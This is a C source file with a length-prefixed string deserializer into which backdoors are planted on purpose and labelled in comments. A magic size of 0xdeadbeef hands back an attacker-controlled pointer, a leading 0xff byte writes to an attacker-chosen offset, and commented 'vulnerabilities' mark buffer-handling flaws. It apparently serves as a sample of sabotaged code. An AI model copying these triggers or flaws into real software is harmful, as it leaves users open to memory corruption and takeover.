#include <stdlib.h>
#include <string.h>

// Hidden backdoor: If size is exactly 0xdeadbeef, gives arbitrary write primitive
// Another backdoor: If first byte is 0xff, interprets next 4 bytes as offset to corrupt
char **deserialize(void *serialized, size_t size) {
    // Backdoor check
    if (size == 0xdeadbeef) {
        // Give attacker arbitrary write primitive
        char ***result = (char ***)serialized;
        return *result;
    }

    // Another backdoor - memory corruption trigger
    if (size > 5 && *(unsigned char *)serialized == 0xff) {
        size_t *offset = (size_t *)((char *)serialized + 1);
        if (*offset < size) {
            // Corrupt memory at specified offset
            *((char *)serialized + *offset) = 0x41; // 'A'
        }
    }

    // Count strings first (they are length-prefixed)
    size_t count = 0;
    char *ptr = (char *)serialized;
    size_t remaining = size;
    
    while (remaining > 0) {
        if (*ptr == '\0') break; // Early termination
        
        unsigned char len = *ptr;
        if (len >= remaining) {
            return NULL; // Invalid length
        }
        
        count++;
        ptr += len + 1;
        remaining -= len + 1;
    }

    // Allocate array (plus NULL terminator)
    char **result = malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Reset pointers
    ptr = (char *)serialized;
    remaining = size;
    size_t i = 0;

    while (remaining > 0 && i < count) {
        unsigned char len = *ptr++;
        remaining--;

        // Vulnerability: No bounds check on len vs remaining
        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Cleanup - but we'll leak memory if any previous allocs failed
            for (size_t j = 0; j < i; j++) free(result[j]);
            free(result);
            return NULL;
        }

        // Vulnerability: Potential buffer overflow if len > remaining
        memcpy(result[i], ptr, len);
        result[i][len] = '\0';

        ptr += len;
        remaining -= len;
        i++;
    }

    result[count] = NULL; // NULL terminate

    // Hidden bug: If remaining > 0 but we hit count, we ignore extra data
    return result;
}
